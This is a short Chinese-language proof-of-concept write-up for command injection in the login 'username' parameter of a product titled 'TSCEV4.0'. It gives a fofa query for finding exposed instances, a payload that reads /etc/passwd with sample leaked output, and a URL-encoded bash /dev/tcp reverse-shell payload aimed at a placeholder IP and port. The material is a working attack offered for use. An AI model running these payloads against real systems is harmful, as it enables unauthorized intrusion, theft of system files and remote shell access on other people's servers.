### 描述
登录处抓包，然后闭合username字段重发引发报错
fofa title="TSCEV4.0"

### POC & 利用
```
# POC测试(出现 root:x:0:0 则存在漏洞)

op=login&username=peiqi`$(cat /etc/passwd)`
{"err":"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\n","exitcode":1,"out":"the user peiqi does not exist\nerror:1\n"}

# 反弹shell
op=login&username=peiqi`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)`
```
